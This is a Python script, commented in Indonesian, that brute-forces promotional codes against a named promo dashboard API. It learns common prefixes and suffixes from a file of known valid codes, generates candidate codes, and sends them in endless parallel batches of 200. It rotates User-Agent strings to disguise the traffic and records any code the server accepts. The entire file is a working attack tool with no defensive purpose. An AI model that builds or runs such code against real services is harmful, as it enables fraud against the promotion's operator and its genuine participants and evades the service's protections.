import asyncio
import aiohttp
import aiofiles
import random
import time
from collections import Counter
import logging
import os

# Konfigurasi warna ANSI
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BRIGHT = "\033[1m"
RESET = "\033[0m"

# Konfigurasi logging ke file untuk debugging
logging.basicConfig(filename='validation.log', format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Daftar User-Agent untuk rotasi
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15A5341f Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]

# Fungsi pembaca dataset kode yang valid
async def read_valid_dataset(file_path='valid_codes.txt'):
    file_path = os.path.join(os.path.dirname(__file__), file_path)
    async with aiofiles.open(file_path, 'r') as f:
        valid_codes = [line.strip() for line in await f.readlines()]
    return valid_codes

# Fungsi untuk mendapatkan pola kode dari dataset
def get_code_patterns(valid_codes):
    prefixes = [code[:2] for code in valid_codes]
    suffixes = [code[-2:] for code in valid_codes]
    return [prefix for prefix, _ in Counter(prefixes).most_common()], [suffix for suffix, _ in Counter(suffixes).most_common()]

# Fungsi untuk menghasilkan kode acak sesuai pola dataset
def generate_code_from_pattern(prefix_list, suffix_list):
    characters = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789'
    return f"{random.choice(prefix_list[:5])}{''.join(random.choices(characters, k=4))}{random.choice(suffix_list[:5])}"

# Validasi kode asinkron
async def validate_code(session, code):
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Content-Type': 'application/json',
    }
    payload = {"uniq_code": code}

    try:
        async with session.post('https://dashboard.yamalubepromo.com/api/v1/wziioquyqthkal', json=payload, headers=headers, timeout=10) as response:
            response_data = await response.text()
            return code, response.status, response_data
    except Exception as e:
        logger.error(f"{RED}Error validasi kode {code}: {str(e)}{RESET}")
        return code, 500, str(e)

# Fungsi validasi batch paralel
async def perform_validation(count, prefix_list, suffix_list):
    async with aiohttp.ClientSession() as session:
        tasks = [validate_code(session, generate_code_from_pattern(prefix_list, suffix_list)) for _ in range(count)]
        return await asyncio.gather(*tasks)

# Fungsi untuk rekapitulasi hasil
async def rekapitulasi(valid_codes, invalid_codes, error_codes, duration):
    summary = (
        f"\n{BRIGHT}Summary:{RESET}\n"
        f"{GREEN}Total kode valid: {len(valid_codes)}{RESET}\n"
        f"{RED}Total kode invalid: {len(invalid_codes)}{RESET}\n"
        f"{YELLOW}Total kode error: {len(error_codes)}{RESET}\n"
        f"{BRIGHT}Jumlah validasi kode: {len(valid_codes) + len(invalid_codes) + len(error_codes)}{RESET}\n"
        f"Waktu validasi: {duration:.2f} detik\n\n"
    )
    print(summary)

# Fungsi utama untuk validasi batch berulang
async def main():
    valid_codes = await read_valid_dataset()
    prefix_list, suffix_list = get_code_patterns(valid_codes)
    count = 200  # Jumlah kode yang ingin divalidasi dalam setiap batch

    while True:  # Looping tak terbatas
        start_time = time.time()
        
        # Melakukan validasi batch
        results = await perform_validation(count, prefix_list, suffix_list)
        
        valid, invalid, error = set(), set(), set()
        for code, status, data in results:
            if status == 200:
                valid.add(code)
                print(f"{GREEN}Kode valid: {code}{RESET}")
            elif status == 400:
                invalid.add(code)
            else:
                error.add(code)
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Rekapitulasi hasil
        await rekapitulasi(valid, invalid, error, duration)
        
        # Jeda 0.5 detik sebelum memulai batch berikutnya
        await asyncio.sleep(0.5)

if __name__ == '__main__':
    asyncio.run(main())
